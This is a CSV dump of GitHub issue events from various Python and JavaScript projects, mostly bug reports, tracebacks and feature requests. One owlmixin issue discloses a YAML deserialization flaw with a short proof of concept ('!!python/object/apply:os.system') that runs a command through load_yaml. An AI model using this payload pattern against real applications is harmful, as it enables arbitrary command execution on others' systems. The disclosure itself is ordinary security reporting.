,type,created_at,repo_id,repo_name,actor_id,actor_login,org_id,org_login,issue_action,issue_title,issue_labels,issue_assignees,issue_count,issue_body,issue_reactions,issue_reason
2652,IssuesEvent,2016-03-18 14:38:51+00:00,9376661,lorenzofox3/Smart-Table,5658170,lildukedana,,,opened,  500 (Internal Server Error),[],[],0,"Been using smart table smoothly since September never had a ""failed to instantiate module"" , 500 randomly hit me this morning worked, it was fine last night.

GET https://rawgit.com/lorenzofox3/Smart-Table/master/dist/smart-table.min.js 500 (Internal Server Error). ",{},{}
2671,IssuesEvent,2016-02-01 07:59:47+00:00,7133153,omab/python-social-auth,1938876,sreejithr,,,opened,Django: Can't create table (Error 150) when doing `migrate`,[],[],0,"I was doing initial migration with `python manage.py migrate` for my Django app with `social_auth` installed. It gives me this error:

```
django.db.utils.OperationalError: (1005, ""Can't create table '<db-name>.#sql-1_b8' (errno: 150)"")
```
I did some investigations and got the faulty query:
```
ALTER TABLE `social_auth_usersocialauth` ADD CONSTRAINT `social_auth_usersociala_user_id_193b2d80880502b2_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`)
```
**At the time of this query, table `auth_user` is non-existent.** I'll try creating it by hand and see what happens. In the meantime, is this a known issue?

My Django version is **`1.8.1`** and:
```
$ mysql --version
mysql  Ver 14.14 Distrib 5.5.47, for linux2.6 (x86_64) using readline 5.1
```",{},{}
2672,IssuesEvent,2015-06-03 15:49:33+00:00,7133153,omab/python-social-auth,8384917,pombreda,,,opened,Support for Atlassian crowd,[],[],0,I wonder if social-auth could support Atlassian crowd? or if this is not in its charter?,{},{}
2677,IssuesEvent,2015-05-11 20:10:58+00:00,7133153,omab/python-social-auth,375302,catskul,,,opened,Session information,[],[],0,"It appears that the session information is not attached to the request by the time the pipeline is executed despite the fact that the middleware order has session middleware first.

This is a problem in that some custom pipelines need that information to operate correctly.

",{},{}
2678,IssuesEvent,2015-06-18 22:51:02+00:00,7133153,omab/python-social-auth,3578908,jasonshark,,,opened,add spotify authentication,[],[],0,I don't see login with spotify listed in the readme. Does this package support login with spotify? Are there future plans to support login with spotify?,{},{}
2697,IssuesEvent,2017-11-07 08:28:51+00:00,73589616,tadashi-aikawa/owlmixin,33394474,Joel-MalwareBenchmark,,,opened,load_yaml and load_yamlf methods is vulnerable,[],[],0,"from owlmixin import util
util.load_yaml('!!python/object/apply:os.system [""calc.exe""]')
util.load_yamlf('joel.yml','utf-8')
#'joel.yml'：!!python/object/apply:os.system [""calc.exe""]

Hi, there is a vulnerability in load_yaml and load_yamlf methods in util.py, please see PoC above. It can execute arbitrary python commands resulting in command execution.",{},{}
2709,IssuesEvent,2016-12-06 04:09:59+00:00,1310572,trentm/python-markdown2,860434,lopopolo,,,opened,2.3.2 regression: fully-qualified links are urlencoded,[],[],0,"I think this is caused by GH-230.

Sample markdown code:

```markdown
[GitHub](https://github.com/lopopolo)
```

Under 2.3.1 with safe_mode = escape renders the following link:

```html
<a href=""https://github.com/lopopolo"">GitHub</a>
```

Under 2.3.2 with safe_mode = escape renders the following link:

```html
<a href=""https%3A%2F%2Fgithub.com%2Flopopolo"">GitHub</a>
```",{},{}
2715,IssuesEvent,2015-02-11 03:40:11+00:00,13421726,wndhydrnt/python-oauth2,6045921,dark-reiser,,,opened,oauth2.web.AuthorizationCodeGrantSiteAdapter raise error,[],[],0,"I used the code example from the **readme.md**

when I ran the code I got error message on my console
'''
Traceback (most recent call last):
  File ""ulo_oauth2.py"", line 11, in <module>
    class ExampleSiteAdapter(oauth2.web.AuthorizationCodeGrantSiteAdapter,
AttributeError: 'module' object has no attribute 'AuthorizationCodeGrantSiteAdapter'
'''
",{},{}
2717,IssuesEvent,2016-08-09 19:29:30+00:00,8490649,Anorov/cloudflare-scrape,5203624,ZizzyZizzy,,,closed,js2py setup errors on CentOS 6,[],[],2,"Errors during setup, but installs it anyway.
# rpm -qa | grep -i ^python | sort -V
python-2.6.6-64.el6.x86_64
python-argparse-1.2.1-2.1.el6.noarch
python-ethtool-0.6-5.el6.x86_64
python-iniparse-0.3.1-2.1.el6.noarch
python-inotify-0.9.1-1.el6.noarch
python-iwlib-0.1-1.2.el6.x86_64
python-libs-2.6.6-64.el6.x86_64
python-pycurl-7.19.0-8.el6.x86_64
python-setuptools-0.6.10-3.el6.noarch
python-urlgrabber-3.9.1-9.el6.noarch


# python setup.py install
(snipped successful output for cfscrape)

Processing dependencies for cfscrape==1.6.6
Searching for Js2Py==0.37
Reading http://pypi.python.org/simple/Js2Py/
Best match: Js2Py 0.37
Downloading https://pypi.python.org/packages/8c/81/586fc7316d3e93b1b69a8fd56bfa559a441c7b5eb466d82cfe43f31350ec/Js2Py-0.37.tar.gz#md5=915b81ddeee6dafcd019737eaf7e8ae7
Processing Js2Py-0.37.tar.gz
Running Js2Py-0.37/setup.py -q bdist_egg --dist-dir /tmp/easy_install-3cOcXQ/Js2Py-0.37/egg-dist-tmp-vwi_JX
SyntaxError: ('invalid syntax', ('build/bdist.linux-x86_64/egg/js2py/host/jsfunctions.py', 13, 36, ""    if string and string[0] in {'+', '-'}:\n""))

SyntaxError: ('invalid syntax', ('build/bdist.linux-x86_64/egg/js2py/constructors/jsobject.py', 21, 35, ""        elif val.TYPE in {'Number', 'String', 'Boolean'}:\n""))

SyntaxError: ('invalid syntax', ('build/bdist.linux-x86_64/egg/js2py/translators/translating_nodes.py', 255, 45, ""        if argument['type'] in {'Identifier', 'MemberExpression'}:\n""))

SyntaxError: ('invalid syntax', ('build/bdist.linux-x86_64/egg/js2py/translators/pyjsparserdata.py', 46, 20, 'TokenName = {v:k for k,v in token.items()}\n'))

SyntaxError: ('invalid syntax', ('build/bdist.linux-x86_64/egg/js2py/translators/friendly_nodes.py', 76, 28, ""        if e[0] not in {'(', '[', '{'}:\n""))

SyntaxError: ('invalid syntax', ('build/bdist.linux-x86_64/egg/js2py/translators/jsregexps.py', 3, 30, ""REGEXP_SPECIAL_SINGLE = {'\\\\', '^', '$', '*', '+', '?', '.'}\n""))

SyntaxError: ('invalid syntax', ('build/bdist.linux-x86_64/egg/js2py/translators/pyjsparser.py', 25, 30, ""REGEXP_SPECIAL_SINGLE = {'\\\\', '^', '$', '*', '+', '?', '.', '[', ']', '(', ')', '{', '{
', '|', '-'}\n""))

SyntaxError: ('invalid syntax', ('build/bdist.linux-x86_64/egg/js2py/translators/std_nodes.py', 528, 37, '        return {k:node_to_dict(v) for k,v in six.iteritems(node)}\n'))

SyntaxError: ('invalid syntax', ('build/bdist.linux-x86_64/egg/js2py/pyjs.py', 50, 22, 'JS_BUILTINS = {k:v for k,v in scope.items()}\n'))

SyntaxError: ('invalid syntax', ('build/bdist.linux-x86_64/egg/js2py/prototypes/jsjson.py', 46, 44, ""                    if v.Class in {'String', 'Number'}:\n""))

SyntaxError: ('invalid syntax', ('build/bdist.linux-x86_64/egg/js2py/prototypes/jsarray.py', 154, 38, ""        if not this.Class in {'Array', 'Arguments'}:\n""))

SyntaxError: ('invalid syntax', ('build/bdist.linux-x86_64/egg/js2py/base.py', 205, 28, ""    PRIMITIVES =  {'String', 'Number', 'Boolean', 'Undefined', 'Null'}\n""))

zip_safe flag not set; analyzing archive contents...
js2py.host.jseval: module MAY be using inspect.stack
SyntaxError: ('invalid syntax', ('/usr/lib/python2.6/site-packages/Js2Py-0.37-py2.6.egg/js2py/pyjs.py', 50, 22, 'JS_BUILTINS = {k:v for k,v in scope.items()}\n'))

SyntaxError: ('invalid syntax', ('/usr/lib/python2.6/site-packages/Js2Py-0.37-py2.6.egg/js2py/base.py', 205, 28, ""    PRIMITIVES =  {'String', 'Number', 'Boolean', 'Undefined', 'Null'}\n""))

SyntaxError: ('invalid syntax', ('/usr/lib/python2.6/site-packages/Js2Py-0.37-py2.6.egg/js2py/host/jsfunctions.py', 13, 36, ""    if string and string[0] in {'+', '-'}:\n""))

SyntaxError: ('invalid syntax', ('/usr/lib/python2.6/site-packages/Js2Py-0.37-py2.6.egg/js2py/constructors/jsobject.py', 21, 35, ""        elif val.TYPE in {'Number', 'String', 'Boolean'}:\n""))

SyntaxError: ('invalid syntax', ('/usr/lib/python2.6/site-packages/Js2Py-0.37-py2.6.egg/js2py/translators/translating_nodes.py', 255, 45, ""        if argument['type'] in {'Identifier', 'MemberExpr
ession'}:\n""))

SyntaxError: ('invalid syntax', ('/usr/lib/python2.6/site-packages/Js2Py-0.37-py2.6.egg/js2py/translators/pyjsparserdata.py', 46, 20, 'TokenName = {v:k for k,v in token.items()}\n'))

SyntaxError: ('invalid syntax', ('/usr/lib/python2.6/site-packages/Js2Py-0.37-py2.6.egg/js2py/translators/friendly_nodes.py', 76, 28, ""        if e[0] not in {'(', '[', '{'}:\n""))

SyntaxError: ('invalid syntax', ('/usr/lib/python2.6/site-packages/Js2Py-0.37-py2.6.egg/js2py/translators/jsregexps.py', 3, 30, ""REGEXP_SPECIAL_SINGLE = {'\\\\', '^', '$', '*', '+', '?', '.'}\n""))

SyntaxError: ('invalid syntax', ('/usr/lib/python2.6/site-packages/Js2Py-0.37-py2.6.egg/js2py/translators/pyjsparser.py', 25, 30, ""REGEXP_SPECIAL_SINGLE = {'\\\\', '^', '$', '*', '+', '?', '.', '[
', ']', '(', ')', '{', '{', '|', '-'}\n""))

SyntaxError: ('invalid syntax', ('/usr/lib/python2.6/site-packages/Js2Py-0.37-py2.6.egg/js2py/translators/std_nodes.py', 528, 37, '        return {k:node_to_dict(v) for k,v in six.iteritems(node)}
\n'))

SyntaxError: ('invalid syntax', ('/usr/lib/python2.6/site-packages/Js2Py-0.37-py2.6.egg/js2py/prototypes/jsjson.py', 46, 44, ""                    if v.Class in {'String', 'Number'}:\n""))

SyntaxError: ('invalid syntax', ('/usr/lib/python2.6/site-packages/Js2Py-0.37-py2.6.egg/js2py/prototypes/jsarray.py', 154, 38, ""        if not this.Class in {'Array', 'Arguments'}:\n""))

Adding Js2Py 0.37 to easy-install.pth file

Installed /usr/lib/python2.6/site-packages/Js2Py-0.37-py2.6.egg
Searching for requests==2.10.0
",{},{}
2729,IssuesEvent,2016-07-11 06:03:05+00:00,3491275,WoLpH/python-progressbar,10374958,ztt1024,,,opened,key_word probelm,[],[],0,"#### Description
I just ran the example code, and it displayed 
_init__() got an unexpected keyword argument 'max_value'

#### Code
import time
import progressbar

with progressbar.ProgressBar(max_value=10) as bar:
    for i in range(10):
        time.sleep(0.1)
        bar.update(i)


#### Versions

- Python version: `import sys; print(sys.version)`
- Python distribution/environment: CPython/Anaconda/IPython/IDLE
- Operating System: Windows 10, Ubuntu Linux, etc.   
- Package version: `import progressbar; print(progressbar.__version__)`  

python version:2.7.6
python environment:anaconda
operating system: Ubuntu
package version:3.9.4

",{},{}
2741,IssuesEvent,2016-05-01 12:14:18+00:00,19182914,aykut/django-bulk-update,91694,candeira,,,opened,"bulk_update_or_create(model_instances) or bulk_update(model_instances, upsert=True)?",[],[],0,"For my current job we need bulk upsert of , and I'm thinking of forking your lib and implementing it myself. If/when I do that, I'd like to do it in the manner that's most likely to be accepted into your project, so as not to maintain an independent fork.

Which syntax do you prefer?

- bulk_update_or_create(model_instances)
- bulk_update(model_instances, upsert=True)

For now I'd only make my changes compatible with Postgres 9.5+, because that's what we're using and because I'm relatively new at this niche.

Any other advice/comment?",{},{}
2749,IssuesEvent,2017-04-07 05:11:39+00:00,40718289,byt3bl33d3r/CrackMapExec,5151193,byt3bl33d3r,,,closed,Pywerview Integration,"[{'id': 247838892, 'url': 'https://api.github.com/repos/byt3bl33d3r/CrackMapExec/labels/enhancement', 'name': 'enhancement', 'color': '84b6eb', 'default': True}]",[],1,"https://github.com/the-useless-one/pywerview

This opens up a lot of possibilities and gives  me an excuse to cut/refactor a significant portion of the codebase.
",{},{}
2763,IssuesEvent,2017-07-07 06:44:43+00:00,53352663,ecederstrand/exchangelib,22004791,SidharthPati,,,opened,Query: Are the messages in a folder retrieved in a sequential order based on time?,[],[],0,"Hi @ecederstrand , I have a couple of questions.

1) Do we fetch the messages in a folder based on received time? Is it always sequential (as we see in outlook - latest mail first approach)?
2) I see that the folders are retrieved randomly. Is there a way to retrieve these folders in a sequential order (say alphabetically)?",{},{}
2769,IssuesEvent,2016-03-28 23:39:57+00:00,695611,etianen/django-reversion,375302,catskul,,,opened,Resolve Django 2.0 deprecation warnings,[],[],0,"```
/home/someuser/project/env/local/lib/python2.7/site-packages/reversion/models.py:137: RemovedInDjango20Warning: on_delete will be a required arg for ForeignKey in Django 2.0. Set it to models.CASCADE on models and in existing migrations if you want to maintain the current default behavior. See https://docs.djangoproject.com/en/1.9/ref/models/fields/#django.db.models.ForeignKey.on_delete
  help_text=""The revision that contains this version."")

/home/someuser/project/env/local/lib/python2.7/site-packages/reversion/models.py:149: RemovedInDjango20Warning: on_delete will be a required arg for ForeignKey in Django 2.0. Set it to models.CASCADE on models and in existing migrations if you want to maintain the current default behavior. See https://docs.djangoproject.com/en/1.9/ref/models/fields/#django.db.models.ForeignKey.on_delete
  help_text=""Content type of the model under version control."")

/home/someuser/project/env/local/lib/python2.7/site-packages/reversion/admin.py:135: RemovedInDjango20Warning: Usage of field.rel has been deprecated. Use field.remote_field instead.
  if isinstance(field, (models.ForeignKey, models.OneToOneField)) and issubclass(self.model, field.rel.to):

/home/someuser/project/env/local/lib/python2.7/site-packages/reversion/admin.py:135: RemovedInDjango20Warning: Usage of ForeignObjectRel.to attribute has been deprecated. Use the model attribute instead.
  if isinstance(field, (models.ForeignKey, models.OneToOneField)) and issubclass(self.model, field.rel.to):

/home/someuser/project/env/local/lib/python2.7/site-packages/reversion/admin.py:135: RemovedInDjango20Warning: Usage of field.rel has been deprecated. Use field.remote_field instead.
  if isinstance(field, (models.ForeignKey, models.OneToOneField)) and issubclass(self.model, field.rel.to):

/home/someuser/project/env/local/lib/python2.7/site-packages/reversion/admin.py:135: RemovedInDjango20Warning: Usage of ForeignObjectRel.to attribute has been deprecated. Use the model attribute instead.
  if isinstance(field, (models.ForeignKey, models.OneToOneField)) and issubclass(self.model, field.rel.to):

/home/someuser/project/env/local/lib/python2.7/site-packages/reversion/admin.py:138: RemovedInDjango20Warning: Usage of field.rel has been deprecated. Use field.remote_field instead.
  if fk_name and not inline_model._meta.get_field(fk_name).rel.is_hidden():


```",{},{}
2771,IssuesEvent,2015-07-16 09:06:44+00:00,695611,etianen/django-reversion,148744,etianen,,,closed,Readonly fields get displayed incorrectly in History view,[],[],6,"I am trying to show users a read-only version of objects' history. The problem is, if I set any fields as read-only, then those show the current version of the object instead of the Version's. 
This seems to be because the render_revision_form method is using the ModelForm 'initial' argument, and then the fieldset.html template does {{ field.contents }}, which points to the original object.

I was thinking we could replace the line
```python
form = ModelForm(instance=obj, initial=self.get_revision_form_data(request, obj, version))
```
with a forloop that modifies obj to with the version data. Do you think this would work, or would it break anything else? Thanks",{},{}
2780,IssuesEvent,2015-11-30 22:19:59+00:00,1072814,jdunck/python-unicodecsv,11149483,ben-en,,,opened,"Calling writer.writerow on a list of strings in python 3.5 results in TypeError: string argument expected, got 'bytes'",[],[],0,"```
> /home/ben/.envs/rss/lib/python3.5/site-packages/unicodecsv/py3.py(29)writerow()
     28         import ipdb; ipdb.set_trace()
---> 29         return self.writer.writerow(row)
     30 

ipdb> p row
['http://localhost:10081/content/HiMFYeCsAfJxP9Jc/allianceearth.org', 'South African team may have solved solar puzzle even Google couldn’t crack', 'ARL', 'ephemeral', 'rss_feeder', '2015-11-30 21:53:07 ', '', '']
ipdb> n
TypeError: string argument expected, got 'bytes'
> /home/ben/.envs/rss/lib/python3.5/site-packages/unicodecsv/py3.py(29)writerow()
     28         import ipdb; ipdb.set_trace()
---> 29         return self.writer.writerow(row)
     30 

ipdb> pinfo self.writer.writerow
Docstring:
writerow(iterable)

Construct and write a CSV record from an iterable of fields.  Non-string
elements will be converted to string.
Type:      builtin_function_or_method
ipdb> [type(x) for x in row]
[<class 'str'>, <class 'str'>, <class 'str'>, <class 'str'>, <class 'str'>, <class 'str'>, <class 'str'>, <class 'str'>]
```

To make extra certain that all of my items in the row i was submitting were in unicode, i also called the following function on all of them:
```
def to_unicode(v, encoding='utf8'):
    """"""
    Convert a value to Unicode string (or just string in Py3). This function
    can be used to ensure string is a unicode string. This may be useful when
    input can be of different types (but meant to be used when input can be
    either bytestring or Unicode string), and desired output is always Unicode
    string.
    The ``encoding`` argument is used to specify the encoding for bytestrings.
    """"""
    if isinstance(v, str):
        return v
    try:
        return v.decode(encoding)
    except (AttributeError, UnicodeEncodeError):
        return str(v)
```

I'm not sure if i'm providing an incorrect argument, but i'd be happy to provide any further information to assist in determining what exactly is going wrong.",{},{}
2799,IssuesEvent,2016-05-22 13:33:59+00:00,22297286,mike-marcacci/objectpath,19516688,timur-biboev,,,opened,Problem with Angular Schema Form,[],[],0,"When Angular Schema Form uses ObjectPath, it does not work properly in my case. In schema-form.js (or schemaForm.js):

`// When building with browserify ObjectPath is available as ""objectpath"" but othwerwise`
`// it's called ""ObjectPath"".`
`var ObjectPath = window.ObjectPath || objectpath;`

`var sfPath = {parse: ObjectPath.parse};`

But this does not work, because of (in ObjectPath.js):

`if (typeof define === 'function' && define.amd) {`
`	define(function() {`
`		return {ObjectPath: ObjectPath};`
`	});`
`}`

It works if I change like that:
`var ObjectPath = window.ObjectPath || objectpath.ObjectPath;`
or like that:
`var sfPath = {parse: objectpath.ObjectPath.parse};`
or like that:
`		return ObjectPath;`
Is it me doing something wrong? I'm using requrejs, if it's does matter.",{},{}
2802,IssuesEvent,2016-08-01 08:56:20+00:00,3049190,moul/advanced-ssh-config,94029,moul,,,opened,Monitor bandwidth peaks,[],[],0,,{},{}
2803,IssuesEvent,2016-02-24 20:38:36+00:00,3049190,moul/advanced-ssh-config,92118,jakeo,,,opened,examples for regex usage,[],[],0,"I'm failing at finding any examples like in the Python version on how to use regex for `Host:`.

I've tried a simple test:

```
  vm-[0-9]:
    HostName: 192.168.1.155
    Port: 2222
```

And while it matches, it's not picking up the port.

Any help here? Thanks!",{},{}
2807,IssuesEvent,2016-06-19 11:15:50+00:00,7152983,pnpnpn/timeout-decorator,2203899,odedfos,,,opened,Thread stuck in self.__queue.get(),[],[],0,"I have a multi-threaded program in which threads call a function decorated with the timeout-decorator:

```
@timeout_decorator.timeout(seconds=300, use_signals=False)
def some_func(param1, param2):
    ...
```

Occasionally one of the threads hangs even though the function (some_func) returns successfully.

This happens after a successful function call when trying to dequeue the result in self.__queue.get():
```
    @property
    def value(self):
        """"""Read-only property containing data returned from function.""""""
        if self.ready is True:
            flag, load = self.__queue.get()
            if flag:
                return load
            raise load
```

It did not reproduce locally, only on prod environment where I used gdb to see what was going on.
Going over the timeout code, I could not figure out what would cause this condition.

Perhaps the library is not thread safe?
Any other idea what could cause this behavior?

As a safety mechanism perhaps you should set the self.__queue.get() to be non blocking
self.__queue.get_nowait()",{},{}
2828,IssuesEvent,2016-10-22 13:32:27+00:00,23389271,tyiannak/pyAudioAnalysis,16451705,xvk58,,,opened,What should be the sound path?,[],[],0,I have multiple voice recordings. I need to extract features from them and save them as a csv file. What should I do from the scratch? Do I need to select the path? ,{},{}
2877,IssuesEvent,2017-10-16 14:30:31+00:00,83844720,ageitgey/face_recognition,896692,ageitgey,,,closed,Side view faces,[],[],1,"Does this algorithm detect side view faces in images too? I am looking for one to implement for TP-GAN.(Beyond face Rotation Paper)
",{},{}
2899,IssuesEvent,2017-04-27 19:41:31+00:00,50591651,danielperna84/pyhomematic,7396998,danielperna84,,,reopened,support for HM-Sec- Key,"[{'id': 318031880, 'url': 'https://api.github.com/repos/danielperna84/pyhomematic/labels/bug', 'name': 'bug', 'color': 'fc2929', 'default': True}]",[],24,"Hi Daniel,
thanks for your work to integrate Homegear.
I've got a HM-Sec-Key device, which is recognized in home-assistant but switch functions produces an error:

`16-11-23 17:43:17 homeassistant.core: Error doing job: Task exception was never retrieved
Traceback (most recent call last):
  File ""/usr/lib/python3.4/asyncio/tasks.py"", line 233, in _step
    result = coro.throw(exc)
  File ""/usr/local/lib/python3.4/dist-packages/homeassistant/core.py"", line 1050, in _event_to_service_call
    yield from service_handler.func(service_call)
  File ""/usr/local/lib/python3.4/dist-packages/homeassistant/components/switch/__init__.py"", line 92, in async_handle_switch_service
    yield from switch.async_turn_off()
  File ""/usr/local/lib/python3.4/dist-packages/homeassistant/helpers/entity.py"", line 356, in async_turn_off
    None, ft.partial(self.turn_off, **kwargs))
  File ""/usr/lib/python3.4/asyncio/futures.py"", line 388, in __iter__
    yield self  # This tells Task to wait for completion.
  File ""/usr/lib/python3.4/asyncio/tasks.py"", line 286, in _wakeup
    value = future.result()
  File ""/usr/lib/python3.4/asyncio/futures.py"", line 277, in result
    raise self._exception
  File ""/usr/lib/python3.4/concurrent/futures/thread.py"", line 54, in run
    result = self.fn(*self.args, **self.kwargs)
  File ""/usr/local/lib/python3.4/dist-packages/homeassistant/components/switch/homematic.py"", line 59, in turn_off
    self._hmdevice.off(self._channel)
AttributeError: 'KeyMatic' object has no attribute 'off'  `

There is no On or Off state for the HM-Sec-Key. 
VALUES of channel 1 are the following:
`{ ""DIRECTION"": 3,
  ""ERROR"": 0,
  ""INHIBIT"": false,
  ""STATE"": true,
  ""STATE_UNCERTAIN"": true }
`

This are the possible values:
`{
  ""DIRECTION"": {
    ""DEFAULT"": 0,
    ""FLAGS"": 3,
    ""ID"": ""DIRECTION"",
    ""MAX"": 3,
    ""MIN"": 0,
    ""OPERATIONS"": 5,
    ""TAB_ORDER"": 0,
    ""TYPE"": ""ENUM"",
    ""UNIT"": """",
    ""VALUE_LIST"": [
      ""NONE"",
      ""UP"",
      ""DOWN"",
      ""UNDEFINED""
    ]
  },
  ""ERROR"": {
    ""CONTROL"": ""NONE"",
    ""DEFAULT"": 0,
    ""FLAGS"": 9,
    ""ID"": ""ERROR"",
    ""MAX"": 2,
    ""MIN"": 0,
    ""OPERATIONS"": 5,
    ""TAB_ORDER"": 1,
    ""TYPE"": ""ENUM"",
    ""UNIT"": """",
    ""VALUE_LIST"": [
      ""NO_ERROR"",
      ""CLUTCH_FAILURE"",
      ""MOTOR_ABORTED""
    ]
  },
  ""INHIBIT"": {
    ""CONTROL"": ""NONE"",
    ""FLAGS"": 1,
    ""ID"": ""INHIBIT"",
    ""MAX"": true,
    ""MIN"": false,
    ""OPERATIONS"": 7,
    ""TAB_ORDER"": 2,
    ""TYPE"": ""BOOL"",
    ""UNIT"": """"
  },
  ""INSTALL_TEST"": {
    ""FLAGS"": 3,
    ""ID"": ""INSTALL_TEST"",
    ""MAX"": true,
    ""MIN"": false,
    ""OPERATIONS"": 2,
    ""TAB_ORDER"": 3,
    ""TYPE"": ""ACTION"",
    ""UNIT"": """"
  },
  ""OPEN"": {
    ""CONTROL"": ""LOCK.OPEN"",
    ""FLAGS"": 1,
    ""ID"": ""OPEN"",
    ""MAX"": true,
    ""MIN"": false,
    ""OPERATIONS"": 2,
    ""TAB_ORDER"": 4,
    ""TYPE"": ""ACTION"",
    ""UNIT"": """"
  },
  ""RELOCK_DELAY"": {
    ""CONTROL"": ""NONE"",
    ""DEFAULT"": 111600,
    ""FLAGS"": 1,
    ""ID"": ""RELOCK_DELAY"",
    ""MAX"": 65535,
    ""MIN"": 0,
    ""OPERATIONS"": 2,
    ""SPECIAL"": [
      {
        ""ID"": ""NOT_USED"",
        ""VALUE"": 111600
      }
    ],
    ""TAB_ORDER"": 5,
    ""TYPE"": ""FLOAT"",
    ""UNIT"": ""s""
  },
  ""STATE"": {
    ""CONTROL"": ""LOCK.STATE"",
    ""FLAGS"": 1,
    ""ID"": ""STATE"",
    ""MAX"": true,
    ""MIN"": false,
    ""OPERATIONS"": 7,
    ""TAB_ORDER"": 6,
    ""TYPE"": ""BOOL"",
    ""UNIT"": """"
  },
  ""STATE_UNCERTAIN"": {
    ""CONTROL"": ""LOCK.UNCERTAIN"",
    ""DEFAULT"": true,
    ""FLAGS"": 1,
    ""ID"": ""STATE_UNCERTAIN"",
    ""MAX"": true,
    ""MIN"": false,
    ""OPERATIONS"": 5,
    ""TAB_ORDER"": 7,
    ""TYPE"": ""BOOL"",
    ""UNIT"": """"
  }
}`

Is it possible to implement this device?

Best regards
Horst",{},{}
2921,IssuesEvent,2016-04-03 11:01:44+00:00,15332342,frejanordsiek/hdf5storage,5252219,frejanordsiek,,,closed,Add MAT-file interop with Julia tests,"[{'url': 'https://api.github.com/repos/frejanordsiek/hdf5storage/labels/build%20enhancement', 'name': 'build enhancement', 'color': 'd4c5f9'}]",[],1,"The [Julia](http://julialang.org/) MAT package (https://github.com/simonster/MAT.jl) provides the ability in Julia to read MAT files (v7.3 and the v5 format that SciPy can work with) and write MAT files (only the v7.3 format currently).

The people who have written the code in that package have also reverse engineered part of the Matlab v7.3 MAT file format metadata. It makes sense to write tests that use that package in Julia to check both of our implementations. It will be useful for catching regressions in the hdf5storage package.",{},{}
2922,IssuesEvent,2016-04-02 18:23:59+00:00,15332342,frejanordsiek/hdf5storage,5252219,frejanordsiek,,,closed,Add support for non-string type keys for dicts,"[{'url': 'https://api.github.com/repos/frejanordsiek/hdf5storage/labels/enhancement', 'name': 'enhancement', 'color': '84b6eb'}]",[],1,"At present (version 0.1.9), only ``dict`` with keys that are entirely unicode strings (``str`` in Python 3.x and ``unicode`` in Python 2.x) can be written to an HDF5 file.

Issue #24 is with regards to supporting the other three string types as keys. Support is also needed for when those other string types can't be converted to UTF-8 or are not a string type.

A straight forward way to add this support is for the keys and values to be packed into separate numpy object arrays and written as if the ``dict`` was ``{'keys': keys, 'values': values}``. A new HDF5 Attribute will be needed for ``dict`` types to indicate whether it is stored as separate keys and values or whether it is stored the current way (Dataset and Group names are keys and their contents the values).
",{},{}
2924,IssuesEvent,2018-01-15 04:09:48+00:00,113642983,henry0312/pytest-docstyle,433434,henry0312,,,opened,Add tests,[],"[{'login': 'henry0312', 'id': 433434, 'avatar_url': 'https://avatars2.githubusercontent.com/u/433434?v=4', 'gravatar_id': '', 'url': 'https://api.github.com/users/henry0312', 'html_url': 'https://github.com/henry0312', 'followers_url': 'https://api.github.com/users/henry0312/followers', 'following_url': 'https://api.github.com/users/henry0312/following{/other_user}', 'gists_url': 'https://api.github.com/users/henry0312/gists{/gist_id}', 'starred_url': 'https://api.github.com/users/henry0312/starred{/owner}{/repo}', 'subscriptions_url': 'https://api.github.com/users/henry0312/subscriptions', 'organizations_url': 'https://api.github.com/users/henry0312/orgs', 'repos_url': 'https://api.github.com/users/henry0312/repos', 'events_url': 'https://api.github.com/users/henry0312/events{/privacy}', 'received_events_url': 'https://api.github.com/users/henry0312/received_events', 'type': 'User', 'site_admin': False}]",0,,{},{}
